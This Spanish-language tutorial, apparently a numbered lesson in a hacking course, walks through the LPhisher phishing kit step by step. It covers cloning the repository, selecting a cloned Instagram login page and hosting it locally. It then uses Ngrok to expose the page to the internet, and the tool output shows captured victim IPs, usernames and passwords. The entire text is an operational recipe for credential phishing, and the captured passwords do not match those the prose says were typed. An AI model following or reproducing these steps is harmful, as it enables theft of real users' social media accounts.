# 41. Phishing con LPhisher

Vamos a ver la herramienta de phishing llamada **LPhisher**.

No es diferente a las demás, pero es una alternativa útil.

## LPhisher

* Repositorio de GitHub (original): [LPhisher](https://github.com/Alygnt/LPhisher)
* Repositorio de GitHub encontrado: [LPhisher](https://github.com/daelin-9r/LPhisher)

Clonamos la herramienta:

```bash
git clone https://github.com/daelin-9r/LPhisher.git
```

Ponemos:

```bash
cd LPhisher
ls
```

Tenemos: **_config.yml**, **core** (directorio), **LICENSE**, **lphisher.sh**, **README.md**.

## Uso

### Localhost

Lanzamos el archivo:

```bash
bash lphisher.sh
```

Tenemos varias opciones para hacer el ataque de phishing. Vamos a hacerlo sobre Instagram `22`:

```plaintext
[-] Select an option : 22
```

Ahora, nos da diferentes opciones:

***OTP**, cuando iniciamos sesión en aplicaciones, hay veces en las cuales nos suelen enviar un código único por **sms**, mensajes de texto,
Whatsapp, Gmail, mail; nos sirve para inciar sesión en la red social que estemos queriendo iniciar sesión y loguearnos.

Esto se hace para verificar que seamos nosotros los que estamos ingresando, iniciando sesión en la cuenta. Sirve como una medida de
seguridad.

En este caso, podemos optar por que nos manden un código de verificación, pero vamos a decir que *no*, aunque tenemos diferentes
opciones de páginas, vamos a hacerlo con la página simple `1`:

```plaintext
[01] Instagram - WITHOUT OTP
[02] Instagram - WITH OTP
[03] Instagram Advanced - WITHOUT OTP
[04] Instagram Advanced - WITH OTP
[05] Instagram Autoliker - WITHOUT OTP
[06] Instagram  Autoliker - WITH OTP
[07] Instagram Followers - WITHOUT OTP
[08] Instagram Followers - WITH OTP
[09] Instagram Verify - WITHOUT OTP
[10] Instagram Old - WITHOUT OTP
[11] Instagram Old - WITH OTP
[12] Instagram Video - WITHOUT OTP

YOUR CHOICE : 1
```

Ahora elegimos el servicio de **port forwarding** queremos. En este caso, le damos en **Localhost**, que no es un servicio de
*port forwarding*, simplemente el sitio web va a estar alojado en un servidor local:

```plaintext
[01] Localhost      [For Devs]
[02] Ngrok.io       [Need to create account]
[03] Cloudflared    [Auto Detects]
[04] LocalXpose     [Max 15 mins]
[-] Select a port forwarding service : 1

[-] Initializing ...  ( http://127.0.0.1 )
```

Se va a estar inicializando el **Localhost**. Vamos a poder acceder a este sitio web siempre y cuando sea en una red local.

Nos dirá que el puerto actual es el `4444`, pero lo vamos a personalizar. Lo pondremos en el puerto `80`:

```plaintext
[-]Your current port : 4444
[?]Do you want to setup a Custom port (Y/n) : y
[?]Type your Custom port : 80
```

Y ya tenemos hospedada la página en un servidor local:

```plaintext
[-] LOCALHOST URL : http://127.0.0.1:80

[-] Waiting for Login Info, Ctrl + C to exit ...
```

Copiamos el enlace y lo pegamos en el navegador, y accedemos a la página de phishing.

Hacemos la prueba ingresando un usuario y contraseña: **usuario1234** y **contraseña1234**, y le damos en **Log In**.

Regresamos a la aplicación y nos da:

```plaintext
[-] Victim IP Found !

Victim's IP : 127.0.0.1

IP Details Saved in : /logs/28-09-2023-07-50-49.txt

[-] Login info Found !

Instagram Username : usuario1234

Saved in : /logs/28-09-2023-07-50-49.txt

Instagram Password : 12345678

Saved in : /logs/28-09-2023-07-50-49.txt

[-] Waiting for Login Info, Ctrl + C to exit.
```

Esto únicamente funciona siempre y cuando estemos dentro de una red local. Ahora, veremos como hacer que el link sea visible fuera de nuestra
red local.

### Ngrok

Usaremos la herramienta **Ngrok** como servicio de *port forwarding*, usaremos sus servicios para convertir nuestro servidor local sea visible
por fuera de nuestra red local.

Damos un **Ctrl + C** e iniciamos la herramienta de vuelta:

```bash
bash lphisher.sh
```

Vamos a seleccionar la opción `22`:

```plaintext
[-] Select an option : 22
```

Ahora, seleccionamos la opción `1`:

```plaintext
[01] Instagram - WITHOUT OTP
...

YOUR CHOICE : 1
```

Le damos en **Localhost**:

```plaintext
[01] Localhost      [For Devs]
[02] Ngrok.io       [Need to create account]
[03] Cloudflared    [Auto Detects]
[04] LocalXpose     [Max 15 mins]
[-] Select a port forwarding service : 1

[-] Initializing ...  ( http://127.0.0.1 )
```

Y abrimos una nueva pestaña y vamos a instalar la aplicación de **Ngrok**.

---

Nos vamos a su [sitio web](https://ngrok.com/).

Es una aplicación que nos sirve para hacer *port forwarding*, para hacer que nuestro servidor local sea visible por fuera de nuestra red local.

Nos hacemos una cuenta, iniciamos sesión, y dentro de nuestra cuenta, vamos a instalar el archivo **zip** de **Ngrok**. Tenemos **Ngrok** para:

* Linux (el que vamos a instalar)
* MacOS
* Windows
* FreeBSD

Seleccionamos **Linux**, nos dirigimos a la carpeta donde se descargó, lo vamos a descomprimir y vamos a configurar un **authtoken**.

Nos dirigimos a la carpeta **Descargas**:

```bash
cd Downloads
ls
```

Y tenemos el archivo `ngrok-v3-stable-linux-amd64.tgz` y lo descomprimimos:

```bash
tar -zxvf ngrok-v3-stable-linux-amd64.tgz
```

Y ahora tenemos la carpeta `ngrok`. Ahora, conectamos nuestra cuenta de **Ngrok** con la aplicación.
Configuramos el **authtoken** copiando y pegando el siguiente comando:

```bash
./ngrok config add-authtoken <token>
```

Ahora, hacemos el *port forwarding* con:

```bash
./ngrok http 80
```

* Recordemos que la aplicación de phishing está lanzada en el puerto `80`

---

Aquí, lo pondremos en el puerto `80`:

```plaintext
[-]Your current port : 4444
[?]Do you want to setup a Custom port (Y/n) : y
[?]Type your Custom port : 80
```

Y ya tenemos hospedada la página en un servidor local:

```plaintext
[-] LOCALHOST URL : http://127.0.0.1:80

[-] Waiting for Login Info, Ctrl + C to exit ...
```

>Ahora, le damos **Enter** al comando anterior `./ngrok http 80` para hacer *port forwarding* del servicio `http` en el puerto `80`

Se nos va a generar un link de **Ngrok**:

```plaintext
Session Status          online
...
Forwarding              https://<content>.ngrok-free.app -> http://localhost:80
```

Con este, ahora hicimos visible nuestro servidor local por fuera de nuestra red local.

Lo copiamos y pegamos en el navegador. Pero tendremos un error, que nos redirige a la página de **Apache**. 
Para solucionarlo, usamos el puerto `8080` y lanzamos de vuelta la aplicación de phishing (también con el puerto `8080`):

```bash
./ngrok http 8080
```

Hacemos la prueba ingresando un usuario y contraseña: **usuario1234** y **contraseña1234**, y le damos en **Log In**.

Regresamos a la aplicación y nos da:

```plaintext
[-] Victim IP Found !

Victim's IP : 127.0.0.1

IP Details Saved in : /logs/28-09-2023-07-50-49.txt

[-] Victim IP Found !

Victim's IP : 190.189.86.111 (example)

IP Details Saved in : /logs/28-09-2023-07-50-49.txt

[-] Login info Found !

Instagram Username : usuario1234

Saved in : /logs/28-09-2023-07-50-49.txt

Instagram Password : 12341234

Saved in : /logs/28-09-2023-07-50-49.txt

[-] Waiting for Login Info, Ctrl + C to exit.
```